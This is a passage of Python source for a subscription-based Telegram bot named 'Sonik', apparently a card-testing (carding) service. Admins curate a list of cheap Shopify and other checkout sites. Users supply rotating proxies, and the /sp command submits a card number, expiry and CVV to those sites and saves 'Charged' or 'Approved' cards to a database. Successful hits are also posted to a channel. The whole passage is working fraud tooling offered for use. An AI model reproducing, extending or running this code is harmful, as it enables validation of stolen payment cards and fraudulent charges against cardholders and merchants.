                res = await verify_site_full(site, random.choice(proxies) if proxies else None, http_session=http_session)
                tested += 1
                if res['status'] == 'rejected':
                    rejected_gateway += 1
                    log_user(uid, "SITE_REJECTED", f"{site} - {res.get('reason', 'unknown')}")
                elif res['status'] == 'alive':
                    working += 1
                    price_val = res.get('price_val', 999)
                    if price_val <= price_range["max"] and price_val >= price_range["min"]:
                        if await add_global_site(site):
                            added += 1
                    else:
                        price_filtered += 1
                else:
                    dead += 1
                if tested % 10 == 0 or tested == total:
                    try:
                        await styled_edit(sm, f"🔍 <b>{bs('Testing')}...</b> {tested}/{total} | ✅{working} ❌{dead} | 🚫{rejected_gateway} | ➕{added} | 💰{price_filtered}", emoji_ids=[CE["fire"]])
                    except:
                        pass
            except:
                dead += 1
                tested += 1
    for i in range(0, len(new_sites), SITE_PER_USER_WORKERS):
        await asyncio.gather(*[asyncio.create_task(test_and_add(s)) for s in new_sites[i:i+SITE_PER_USER_WORKERS]], return_exceptions=True)
    await styled_edit(sm, f"""✅ <b>{bs('Add Sites Complete')}</b> ✅
<b>━━━━━━━━━━━━━━━━━</b>
🔍 <b>{bs('Tested')}:</b> <code>{tested}</code>
✅ <b>{bs('Working')}:</b> <code>{working}</code>
❌ <b>{bs('Dead')}:</b> <code>{dead}</code>
🚫 <b>{bs('Rejected (Dead/Error/Invalid Response)')}:</b> <code>{rejected_gateway}</code>
💰 <b>{bs('Price Filtered')}:</b> <code>{price_filtered}</code>
<b>━━━━━━━━━━━━━━━━━</b>
➕ <b>{bs('Added')} (${price_range['min']}-${price_range['max']}):</b> <code>{added}</code>
📋 <b>{bs('Already Existed')}:</b> <code>{len(already_exists)}</code>
<b>━━━━━━━━━━━━━━━━━</b>
✅ <i>{bs('Only working sites with accepted responses are added')}</i>""", emoji_ids=[CE["check"], CE["check"], CE["globe"], CE["fire"], CE["cross"], CE["chart"], CE["warn"], CE["info"]])
    await cleanup_user_http_session(uid, "site")
    cleanup_user_sem(uid)
@client.on(events.NewMessage(pattern=r'(?i)^[/.]rm\b'))
async def remove_site(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"🚫 <b>{bs('Admin only')}</b>", emoji_ids=[CE["stop"]])
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    rt = re.sub(r'^[/.]rm\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if rt.lower() == 'all':
        c = await clear_all_global_sites()
        return await styled_reply(event, f"✅ <b>{bs('Removed')} {c} {bs('sites')}</b>", emoji_ids=[CE["check"]])
    if not rt:
        return await styled_reply(event, f"📝 <code>/rm site.com</code> {bs('or')} <code>/rm all</code>", emoji_ids=[CE["info"]])
    to_rm = extract_urls_from_text(rt)
    if not to_rm:
        return await styled_reply(event, f"⚠️ <b>{bs('No valid URLs')}</b>", emoji_ids=[CE["cross"]])
    existing = await get_global_sites()
    removed = []
    for s in to_rm:
        norm = normalize_site_url(s)
        for ex in existing:
            if normalize_site_url(ex) == norm:
                if await remove_global_site(ex):
                    removed.append(ex)
                break
    await styled_reply(event, f"✅ <b>{bs('Removed')}:</b> <code>{len(removed)}</code>", emoji_ids=[CE["check"]])
@client.on(events.NewMessage(pattern=r'(?i)^[/.]sites$'))
async def list_sites(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"🚫 <b>{bs('Admin only')}</b>", emoji_ids=[CE["stop"]])
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    sites = await get_global_sites()
    if not sites:
        return await styled_reply(event, f"📋 <b>{bs('No sites')}</b> <code>/add</code>", emoji_ids=[CE["warn"]])
    text = f"🌐 <b>{bs('Global Sites')}</b> ({len(sites)}) 🌐\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    eid = [CE["fire"], CE["fire"]]
    for i, s in enumerate(sites[:50], 1):
        text += f"🔗 <code>{i}.</code> <b>{s}</b>\n"
        eid.append(CE["link"])
    if len(sites) > 50:
        text += f"\n<i>+{len(sites)-50} more</i>"
    await styled_reply(event, text, emoji_ids=eid)
@client.on(events.NewMessage(pattern=r'(?i)^[/.]site\b'))
async def check_sites_with_filter_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"🚫 <b>{bs('Admin only')}</b>", emoji_ids=[CE["stop"]])
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    sites = await get_global_sites()
    if not sites:
        return await styled_reply(event, f"📋 <b>{bs('No sites')}</b>", emoji_ids=[CE["warn"]])
    kb = [
        [pbtn(f"💰 {bs('0.01-5 USD')}", f"site_price_range:1:{event.sender_id}"), pbtn(f"💰 {bs('0.01-10 USD')}", f"site_price_range:2:{event.sender_id}")],
        [pbtn(f"💰 {bs('0.01-20 USD')}", f"site_price_range:3:{event.sender_id}"), pbtn(f"💰 {bs('0.01-40 USD')}", f"site_price_range:4:{event.sender_id}")],
        [pbtn(f"💰 {bs('5-10 USD')}", f"site_price_range:5:{event.sender_id}"), pbtn(f"💰 {bs('5-20 USD')}", f"site_price_range:6:{event.sender_id}")],
        [pbtn(f"💰 {bs('10-20 USD')}", f"site_price_range:7:{event.sender_id}"), pbtn(f"💰 {bs('20-40 USD')}", f"site_price_range:8:{event.sender_id}")],
        [pbtn(f"📊 {bs('All Sites (No Filter)')}", f"site_price_range:0:{event.sender_id}")],
    ]
    await styled_reply(event, f"""🔍 <b>{bs('Site Check with Filter')}</b> 🔍
<b>━━━━━━━━━━━━━━━━━</b>
🌐 <b>{bs('Total Sites')}:</b> <code>{len(sites)}</code>
<b>━━━━━━━━━━━━━━━━━</b>
💰 <i>{bs('Select price range to filter')}</i>
✅ <i>{bs('Only sites with accepted responses are kept')}</i>""", buttons=kb, emoji_ids=[CE["fire"], CE["fire"], CE["globe"], CE["info"]])
@client.on(events.CallbackQuery(pattern=rb"site_price_range:(\d+):(\d+)"))
async def site_price_range_cb(event):
    range_id = int(event.pattern_match.group(1).decode())
    admin_id = int(event.pattern_match.group(2).decode())
    if event.sender_id != admin_id:
        return await event.answer(f"🚫 {bs('Not for you')}!", alert=True)
    await event.answer(f"🔍 {bs('Checking sites...')}!")
    try:
        await event.delete()
    except:
        pass
    if range_id == 0:
        price_range = {"min": 0, "max": 9999, "name": "All Sites"}
    else:
        price_range = PRICE_RANGES.get(str(range_id), PRICE_RANGES["1"])
    asyncio.create_task(_process_site_check_with_filter(event, price_range))
async def _process_site_check_with_filter(event, price_range):
    uid = event.sender_id
    sites = await get_global_sites()
    total = len(sites)
    tested = 0
    alive = 0
    dead = 0
    price_filtered = 0
    kept = 0
    rejected_gateway = 0
    proxies = await get_all_user_proxies(uid)
    user_site_sem = get_user_sem(uid, "site")
    http_session = await get_user_http_session(uid, "site")
    sm = await styled_reply(event, f"🔍 <b>{bs('Checking')} {total} {bs('sites')}...</b>", emoji_ids=[CE["fire"]])
    results = []
    async def check_worker(site):
        nonlocal tested, alive, dead, price_filtered, kept, rejected_gateway
        async with user_site_sem:
            try:
                res = await verify_site_full(site, random.choice(proxies) if proxies else None, http_session=http_session)
                tested += 1
                if res['status'] == 'rejected':
                    rejected_gateway += 1
                    log_user(uid, "SITE_REJECTED", f"{site} - {res.get('reason', 'unknown')}")
                elif res['status'] == 'alive':
                    price_val = res.get('price_val', 999)
                    if price_val <= price_range["max"] and price_val >= price_range["min"]:
                        alive += 1
                        kept += 1
                        results.append({'site': site, 'status': 'alive', 'price': res.get('price', '-'), 'price_val': price_val, 'gateway': res.get('gateway', 'unknown')})
                    else:
                        price_filtered += 1
                else:
                    dead += 1
                if tested % 10 == 0 or tested == total:
                    try:
                        await styled_edit(sm, f"🔍 <b>{bs('Checking')}...</b> {tested}/{total} | ✅{alive} ❌{dead} | 🚫{rejected_gateway} | 📋{kept}", emoji_ids=[CE["fire"]])
                    except:
                        pass
            except:
                dead += 1
                tested += 1
    for i in range(0, len(sites), SITE_PER_USER_WORKERS):
        await asyncio.gather(*[asyncio.create_task(check_worker(s)) for s in sites[i:i+SITE_PER_USER_WORKERS]], return_exceptions=True)
    removed_count = 0
    for site in sites:
        norm = normalize_site_url(site)
        found = False
        for r in results:
            if normalize_site_url(r['site']) == norm:
                found = True
                break
        if not found:
            if await remove_global_site(site):
                removed_count += 1
    results.sort(key=lambda x: x['price_val'])
    top_sites_text = ""
    for i, r in enumerate(results[:20], 1):
        gw_flag = "🛍️" if r.get('gateway') == 'shopify' else "💳"
        top_sites_text += f"🔗 <code>{i}.</code> {gw_flag} <b>{r['site']}</b> ━ <code>{r['price']}</code>\n"
    await styled_edit(sm, f"""✅ <b>{bs('Site Check Complete')}</b> ✅
<b>━━━━━━━━━━━━━━━━━</b>
💰 <b>{bs('Filter')}:</b> <code>{price_range['name']}</code>
🔍 <b>{bs('Total Tested')}:</b> <code>{total}</code>
✅ <b>{bs('Alive')}:</b> <code>{alive}</code>
❌ <b>{bs('Dead')}:</b> <code>{dead}</code>
🚫 <b>{bs('Rejected (Dead/Error/Invalid Response)')}:</b> <code>{rejected_gateway}</code>
💰 <b>{bs('Price Filtered Out')}:</b> <code>{price_filtered}</code>
📋 <b>{bs('Removed from sites.txt')}:</b> <code>{removed_count}</code>
📋 <b>{bs('Kept in sites.txt')}:</b> <code>{kept}</code>
<b>━━━━━━━━━━━━━━━━━</b>
🏆 <b>{bs('Top Sites (Lowest Price)')}:</b>
{top_sites_text if top_sites_text else 'None'}
<b>━━━━━━━━━━━━━━━━━</b>
🛍️ = Shopify | 💳 = Other Gateway""", emoji_ids=[CE["check"], CE["check"], CE["fire"], CE["globe"], CE["cross"], CE["chart"], CE["star"]])
    await cleanup_user_http_session(uid, "site")
    cleanup_user_sem(uid)
@client.on(events.NewMessage(pattern=r'(?i)^[/.]addpxy'))
async def add_proxy_cmd(event):
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if event.is_group:
        return await styled_reply(event, f"🔒 <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    if not await require_subscription(event) and event.sender_id not in ADMIN_ID:
        return
    try:
        lines = []
        if event.is_reply:
            rm = await event.get_reply_message()
            if rm.file:
                fp = await rm.download_media()
                try:
                    async with aiofiles.open(fp, "r", encoding="utf-8") as f:
                        lines = [l.strip() for l in (await f.read()).splitlines() if l.strip()]
                finally:
                    try:
                        os.remove(fp)
                    except:
                        pass
            elif rm.text:
                lines = [l.strip() for l in rm.text.splitlines() if l.strip()]
        else:
            p = event.raw_text.split(maxsplit=1)
            if len(p) == 2:
                lines = [l.strip() for l in p[1].splitlines() if l.strip()]
            else:
                return await styled_reply(event, f"📝 <code>/addpxy ip:port:user:pass</code>", emoji_ids=[CE["info"]])
        if not lines:
            return await styled_reply(event, f"⚠️ <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
        cc = await get_proxy_count(event.sender_id)
        if cc >= 1000:
            return await styled_reply(event, f"🚫 <b>{bs('Limit 1000/1000')}</b>", emoji_ids=[CE["cross"]])
        existing = {p['proxy_url'] for p in await get_all_user_proxies(event.sender_id)}
        parsed = []
        for l in lines:
            pd = parse_proxy_format(l)
            if pd and pd['proxy_url'] not in existing:
                parsed.append(pd)
                existing.add(pd['proxy_url'])
        if not parsed:
            return await styled_reply(event, f"⚠️ <b>{bs('No valid proxies')}</b>", emoji_ids=[CE["cross"]])
        parsed = parsed[:1000-cc]
        tm = await styled_reply(event, f"🛡️ <b>{bs('Testing')} {len(parsed)}...</b>", emoji_ids=[CE["shield"]])
        added, failed = [], []
        batch_size = PROXY_CHECK_BATCH
        for i in range(0, len(parsed), batch_size):
            batch = parsed[i:i+batch_size]
            results = await test_proxies_batch(batch)
            for pd2, res in zip(batch, results):
                if isinstance(res, tuple) and res[0]:
                    await add_proxy_db(event.sender_id, pd2)
                    added.append(1)
                else:
                    failed.append(1)
        await styled_edit(tm, f"✅ <b>{bs('Done')}</b> ✅{len(added)} ❌{len(failed)} | 📋 {bs('Total')}: {cc+len(added)}/1000", emoji_ids=[CE["fire"]])
    except Exception as e:
        await styled_reply(event, f"⚠️ <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])
@client.on(events.NewMessage(pattern=r'(?i)^[/.]proxy$'))
async def view_proxies(event):
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if event.is_group:
        return await styled_reply(event, f"🔒 <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    if not await require_subscription(event) and event.sender_id not in ADMIN_ID:
        return
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies:
        return await styled_reply(event, f"📋 <b>{bs('No proxies')}</b> <code>/addpxy</code>", emoji_ids=[CE["cross"]])
    text = f"🛡️ <b>{bs('Proxies')}</b> ({len(proxies)}/1000) 🛡️\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    eid = [CE["fire"], CE["fire"]]
    for i, p in enumerate(proxies[:30], 1):
        text += f"🔗 <code>{i}.</code> 🌐 <b>{p['ip']}:{p['port']}</b>\n"
        eid.append(CE["link"])
    if len(proxies) > 30:
        text += f"\n<i>+{len(proxies)-30} more</i>"
    text += f"\n🗑️ <code>/rmpxy index</code>"
    eid.append(CE["trash"])
    await styled_reply(event, text, emoji_ids=eid)
@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmpxy'))
async def remove_proxy_cmd(event):
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if event.is_group:
        return await styled_reply(event, f"🔒 <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    if not await require_subscription(event) and event.sender_id not in ADMIN_ID:
        return
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies:
        return await styled_reply(event, f"📋 <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
    p = event.raw_text.split(maxsplit=1)
    if len(p) == 1:
        return await styled_reply(event, f"📝 <code>/rmpxy index</code> or <code>all</code>", emoji_ids=[CE["warn"]])
    arg = p[1].strip().lower()
    if arg == 'all':
        c = await clear_all_proxies(event.sender_id)
        return await styled_reply(event, f"🗑️ <b>{bs('Cleared')} {c}</b>", emoji_ids=[CE["check"]])
    try:
        idx = int(arg) - 1
        if 0 <= idx < len(proxies):
            rm = await remove_proxy_by_index(event.sender_id, idx)
            await styled_reply(event, f"🗑️ <b>{bs('Removed')} {rm['ip']}:{rm['port']}</b>", emoji_ids=[CE["check"]])
        else:
            await styled_reply(event, f"⚠️ <b>{bs('Invalid index')}</b>", emoji_ids=[CE["cross"]])
    except:
        await styled_reply(event, f"⚠️ <b>{bs('Invalid')}</b>", emoji_ids=[CE["cross"]])
@client.on(events.NewMessage(pattern=r'(?i)^[/.]chkpxy$'))
async def check_proxies_cmd(event):
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if event.is_group:
        return await styled_reply(event, f"🔒 <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    if not await require_subscription(event) and event.sender_id not in ADMIN_ID:
        return
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies:
        return await styled_reply(event, f"📋 <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
    sm = await styled_reply(event, f"🛡️ <b>{bs('Testing')} {len(proxies)}...</b>", emoji_ids=[CE["shield"]])
    results = await test_proxies_batch(proxies)
    w = sum(1 for r in results if isinstance(r, tuple) and r[0])
    await styled_edit(sm, f"🛡️ <b>{bs('Proxy Check')}</b>\n✅ {bs('Working')}: {w}\n❌ {bs('Dead')}: {len(results)-w}", emoji_ids=[CE["shield"]])
@client.on(events.NewMessage(pattern=r'(?i)^[/.]sp\b'))
async def single_cc_check(event):
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    if uid not in ADMIN_ID and not await is_user_subscribed(uid):
        return await send_no_subscription_message(event)
    await update_last_seen(uid)
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
        name = sender.first_name or username
    except:
        username, name = f"user_{uid}", "User"
    sites = await get_global_sites()
    if not sites:
        return await styled_reply(event, f"⚠️ <b>{bs('No sites available. Admin please add sites.')}</b>", emoji_ids=[CE["warn"]])
    proxies = await get_all_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, f"""🛡️ <b>{bs('No Proxies Found')}</b> 🛡️
<b>━━━━━━━━━━━━━━━━━</b>
⚠️ <b>{bs('You must add proxies first')}</b>
💡 <i>{bs('Use /addpxy to add proxies')}</i>
<b>━━━━━━━━━━━━━━━━━</b>
📝 <code>/addpxy ip:port:user:pass</code>
💡 <i>{bs('Then try /sp again')}</i>""", emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["link"], CE["info"]])
    rm = await event.get_reply_message() if event.reply_to_msg_id else None
    card = None
    if rm and rm.text:
        cc = extract_cc(rm.text)
        if cc:
            card = cc[0]
    if not card:
        cc = extract_cc(event.message.text)
        if cc:
            card = cc[0]
    if not card:
        return await styled_reply(event, f"📝 <code>/sp card|mm|yy|cvv</code>", emoji_ids=[CE["info"]])
    lm = await styled_reply(event, f"⏳ {bs('Processing')}… ⏳")
    st = time.time()
    rotator = SmartRotator()
    try:
        http_session = await get_user_http_session(uid, "sp")
        async with get_user_sem(uid, "sp"):
            bin_task = asyncio.create_task(get_bin_info(card.split('|')[0]))
            result = await check_card_with_retry(card, sites, uid, proxies, 3, rotator, http_session=http_session)
            bi = await bin_task
        elapsed = round(time.time() - st, 2)
        status = result.get('Status', 'Declined')
        if status in ["Charged", "Approved"]:
            asyncio.create_task(save_card_to_db(card, status.upper(), result.get('Response', ''), result.get('Gateway', ''), result.get('Price', '')))
        msg, eid = format_simple_card_result(status, card, result.get('Gateway', '?'), result.get('Response', '')[:150], bi, elapsed, extra_field=("Price", result.get('Price', '-')) if result.get('Price', '-') != '-' else None)
        try:
            await lm.delete()
        except:
            pass
        HIT_BUTTON = [[Button.url("🚀 " + bs("Sonik"), f"https://t.me/{MAIN_BOT_USERNAME}")]]
        await styled_reply(event, msg, emoji_ids=eid, buttons=HIT_BUTTON)
        if status == "Charged":
            asyncio.create_task(send_channel_hit(result, uid, username, name))
        elif status == "Approved":
            asyncio.create_task(send_channel_hit(result, uid, username, name))
    except Exception as e:
        try:
            await lm.delete()
        except:
            pass
        await styled_reply(event, f"⚠️ <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])
@client.on(events.NewMessage(pattern=r'(?i)^[/.]info$'))
async def info_cmd(event):
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    await ensure_user(event.sender_id)
    sub = await get_user_subscription(event.sender_id)
    pc = await get_proxy_count(event.sender_id)
    if event.sender_id in ADMIN_ID:
        status_text = f"👑 {bs('Admin')}"
        se = [CE["crown"]]
    elif sub["is_active"]:
        remaining = sub["remaining_hours"]
        remaining_str = f"{int(remaining * 60)} min" if remaining < 1 else f"{remaining:.1f} h"
        status_text = f"✅ {bs('Active')} | {remaining_str}"
        se = [CE["check"]]
    else:
        status_text = f"❌ {bs('No Subscription')}"
        se = [CE["cross"]]
    await styled_reply(event, f"""👤 <b>{bs('Profile')}</b> 👤
<b>━━━━━━━━━━━━━━━━━</b>
🆔 <b>{bs('ID')}:</b> <code>{event.sender_id}</code>
📊 <b>{bs('Status')}:</b> <code>{status_text}</code>
🛡️ <b>{bs('Proxies')}:</b> <code>{pc}/{bs('1000')}</code>
<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>@{PAYMENT_BOT_USERNAME}</b> {bs('to subscribe')}
🎁 <code>/redeem</code> {bs('to use a code')}""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["star"], CE["shield"], CE["link"]] + se)
@client.on(events.NewMessage(pattern=r'(?i)^[/.](maintenance|maintance)\s+(on|off)$'))
async def maint_toggle(event):
    if event.sender_id not in ADMIN_ID:
        return
    a = event.raw_text.lower().split()[1]
    await set_maintenance_mode(a == "on")
    await styled_reply(event, f"🔧 <b>{bs('Maintenance')} {bs('On') if a == 'on' else bs('Off')}</b>", emoji_ids=[CE["stop"] if a == "on" else CE["check"]])
@client.on(events.NewMessage(pattern=r'(?i)^[/.]ban\b'))
async def block_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split()
    if len(parts) < 2:
        return await styled_reply(event, f"📝 <code>/ban user_id</code>", emoji_ids=[CE["warn"]])
    try:
        target_uid = int(parts[1])
    except ValueError:
        return await styled_reply(event, f"⚠️ <b>{bs('Invalid ID')}</b>", emoji_ids=[CE["cross"]])
    await ensure_user(target_uid)
    await ban_user(target_uid, event.sender_id)
    if target_uid in ACTIVE_MTXT_PROCESSES:
        proc = ACTIVE_MTXT_PROCESSES[target_uid]
        if isinstance(proc, dict):
            proc["stopped"] = True
            for t in proc.get("tasks", []):
                if not t.done():
                    t.cancel()
    await styled_reply(event, f"🚫 <b>{bs('Blocked')}</b> <code>{target_uid}</code>", emoji_ids=[CE["check"]])
    try:
        await styled_send(target_uid, f"🚫 <b>{bs('You have been blocked from using Sonik')}</b>\n💡 <i>{bs('Contact admin if you think this is a mistake')}</i>", emoji_ids=[CE["stop"], CE["info"]])
    except:
        pass
@client.on(events.NewMessage(pattern=r'(?i)^[/.]unban\b'))
async def unblock_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split()
    if len(parts) < 2:
        return await styled_reply(event, f"📝 <code>/unban user_id</code>", emoji_ids=[CE["warn"]])
    try:
        target_uid = int(parts[1])
    except ValueError:
        return await styled_reply(event, f"⚠️ <b>{bs('Invalid ID')}</b>", emoji_ids=[CE["cross"]])
    await ensure_user(target_uid)
    is_banned = await is_banned_user(target_uid)
    if not is_banned:
        return await styled_reply(event, f"✅ <b>{bs('User is not banned')}</b>", emoji_ids=[CE["warn"]])
    success = await unban_user(target_uid)
    if success:
        await styled_reply(event, f"✅ <b>{bs('Unblocked')}</b> <code>{target_uid}</code>", emoji_ids=[CE["check"]])
        try:
            await styled_send(target_uid,
                f"✅ <b>{bs('You have been unblocked')}</b>\n"
                f"📝 <code>/start</code> {bs('to use Sonik again')}",
                emoji_ids=[CE["check"], CE["info"]])
        except:
            pass
    else:
        await styled_reply(event, f"⚠️ <b>{bs('Failed to unblock user')}</b>", emoji_ids=[CE["cross"]])
@client.on(events.NewMessage(pattern=r'(?i)^[/.]users$'))
async def users_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    users = await get_all_users()
    if not users:
        return await styled_reply(event, f"📋 <b>{bs('No users found')}</b>", emoji_ids=[CE["warn"]])
    text = f"👥 <b>{bs('Users List')}</b> ({len(users)}) 👥\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    eid = [CE["fire"], CE["fire"]]
    for i, u in enumerate(users[:30], 1):
        uid = u.get('user_id', '?')
        banned = "🔴" if u.get('banned', False) else "🟢"
        last_seen = u.get('last_seen')
        last_seen_str = last_seen.strftime('%m-%d %H:%M') if last_seen else 'Never'
        sub_end = u.get('subscription_end')
        is_sub_active = False
        if sub_end and isinstance(sub_end, datetime):
            if sub_end.tzinfo is None:
                sub_end = sub_end.replace(tzinfo=timezone.utc)
            if datetime.now(timezone.utc) < sub_end:
                is_sub_active = True
        elif u.get('subscription_plan') == 'unlimited':
            is_sub_active = True
        sub_status = "✅" if is_sub_active else "❌"
        text += f"🆔 {banned} {sub_status} <code>{i}.</code> <b>{uid}</b> ━ {last_seen_str}\n"
        eid.append(CE["link"])
    if len(users) > 30:
        text += f"\n<i>+{len(users)-30} more</i>"
    text += f"\n<b>━━━━━━━━━━━━━━━━━</b>\n🟢 Active | 🔴 Blocked | ✅ Subscribed | ❌ No Sub"
    await styled_reply(event, text, emoji_ids=eid)
@client.on(events.NewMessage(pattern=r'(?i)^[/.]broadcast\b'))
async def broadcast_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    reply_msg = await event.get_reply_message()
    broadcast_text = None
    if reply_msg:
        if reply_msg.text:
            broadcast_text = reply_msg.text
        elif reply_msg.media:
            broadcast_text = None
            await styled_reply(event, f"""📢 <b>{bs('Broadcast Media?')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
📤 {bs('This will forward the media to ALL users.')}
❓ {bs('Are you sure?')}
<b>━━━━━━━━━━━━━━━━━</b>
✅ {bs('Click confirm to proceed.')}""", buttons=[[pbtn("✅ " + bs("Confirm Broadcast"), f"confirm_broadcast_media:{event.sender_id}")], [pbtn("❌ " + bs("Cancel"), f"cancel_broadcast")]], emoji_ids=[CE["warn"], CE["info"]])
            async def cb(wait_event):
                if wait_event.data.startswith(b"confirm_broadcast_media"):
                    if int(wait_event.data.split(b":")[1]) == event.sender_id:
                        await wait_event.answer(f"📤 {bs('Broadcasting...')}!")
                        await wait_event.delete()
                        await broadcast_to_all_users(event, msg=None, media_msg=reply_msg)
                elif wait_event.data == b"cancel_broadcast":
                    await wait_event.answer(f"❌ {bs('Cancelled.')}!")
                    try:
                        await wait_event.delete()
                    except: pass
            client.add_event_handler(cb, events.CallbackQuery)
            return
    else:
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) < 2:
            return await styled_reply(event, f"""📢 <b>{bs('Broadcast')}</b> 📢
<b>━━━━━━━━━━━━━━━━━</b>
📝 <code>/broadcast Your message here</code>
💡 {bs('Or reply to a message with /broadcast')}""", emoji_ids=[CE["info"]])
        broadcast_text = parts[1]
    if not broadcast_text and not reply_msg:
        return
    await styled_reply(event, f"""📢 <b>{bs('Broadcast Message?')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
📤 {bs('This will send the following to ALL users:')}
<b>━━━━━━━━━━━━━━━━━</b>
{broadcast_text[:300]}
<b>━━━━━━━━━━━━━━━━━</b>
❓ {bs('Are you sure?')}
<b>━━━━━━━━━━━━━━━━━</b>
✅ {bs('Click confirm to proceed.')}""", buttons=[[pbtn("✅ " + bs("Confirm Broadcast"), f"confirm_broadcast_text:{event.sender_id}")], [pbtn("❌ " + bs("Cancel"), f"cancel_broadcast")]], emoji_ids=[CE["warn"], CE["info"]])
    async def cb(wait_event):
        if wait_event.data.startswith(b"confirm_broadcast_text"):
            if int(wait_event.data.split(b":")[1]) == event.sender_id:
                await wait_event.answer(f"📤 {bs('Broadcasting...')}!")
                await wait_event.delete()
                await broadcast_to_all_users(event, msg=broadcast_text, media_msg=None)
        elif wait_event.data == b"cancel_broadcast":
            await wait_event.answer(f"❌ {bs('Cancelled.')}!")
            try:
                await wait_event.delete()
            except: pass
    client.add_event_handler(cb, events.CallbackQuery)
async def broadcast_to_all_users(original_event, msg, media_msg):
    users = await get_all_users()
    if not users:
        await styled_reply(original_event, f"⚠️ <b>{bs('No users to broadcast to')}</b>", emoji_ids=[CE["warn"]])
        return
    success = 0
    fail = 0
    status_msg = await styled_reply(original_event, f"📤 <b>{bs('Broadcasting...')}</b>\n0/{len(users)}", emoji_ids=[CE["fire"]])
    for user in users:
        uid = user.get('user_id')
        if not uid:
            continue
        try:
            if media_msg:
                await client.forward_messages(uid, media_msg)
            else:
                await styled_send(uid, msg, emoji_ids=[CE["star"]])
            success += 1
        except:
            fail += 1
        if (success + fail) % 10 == 0:
            try:
                await styled_edit(status_msg, f"📤 <b>{bs('Broadcasting...')}</b>\n{success+fail}/{len(users)}\n✅ {success} | ❌ {fail}", emoji_ids=[CE["fire"]])
            except: pass
        await asyncio.sleep(0.05)
    await styled_edit(status_msg, f"""✅ <b>{bs('Broadcast Complete')}</b>
✅ {bs('Sent')}: {success}
❌ {bs('Failed')}: {fail}""", emoji_ids=[CE["check"], CE["cross"]])
@client.on(events.NewMessage(pattern=r'(?i)^[/.]give\b'))
async def give_subscription_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split()
    if len(parts) < 3:
        return await styled_reply(event, f"""🎁 <b>{bs('Give Subscription')}</b> 🎁
<b>━━━━━━━━━━━━━━━━━</b>
📝 <code>/give user_id hours</code>
💡 <i>{bs('Example: /give 123456789 24')}</i>
💡 <i>{bs('For unlimited admin access, set hours=0')}</i>""", emoji_ids=[CE["info"]])
    try:
        target_uid = int(parts[1])
        hours = int(parts[2])
        await ensure_user(target_uid)
        if hours > 0:
            await set_user_subscription(target_uid, "admin_gift", hours)
            await styled_reply(event, f"""🎁 <b>{bs('Subscription Given')}</b> 🎁
<b>━━━━━━━━━━━━━━━━━</b>
👤 <b>{bs('User')}:</b> <code>{target_uid}</code>
⏰ <b>{bs('Duration')}:</b> <code>{hours} hours</code>""", emoji_ids=[CE["check"], CE["check"], CE["star"], CE["gem"]])
            try:
                await styled_send(target_uid, f"""🎁 <b>{bs('Admin Gave You a Subscription!')}</b> 🎁
<b>━━━━━━━━━━━━━━━━━</b>
⏰ <b>{bs('Duration')}:</b> <code>{hours} hours</code>
<b>━━━━━━━━━━━━━━━━━</b>
📝 <code>/start</code> {bs('to use Sonik')}""", emoji_ids=[CE["gift"], CE["gift"], CE["star"], CE["info"]])
            except:
                pass
        else:
            await db["users"].update_one({"user_id": target_uid}, {"$set": {"subscription_plan": "unlimited", "subscription_end": None}})
            await styled_reply(event, f"""👑 <b>{bs('Unlimited Access Given')}</b> 👑
<b>━━━━━━━━━━━━━━━━━</b>
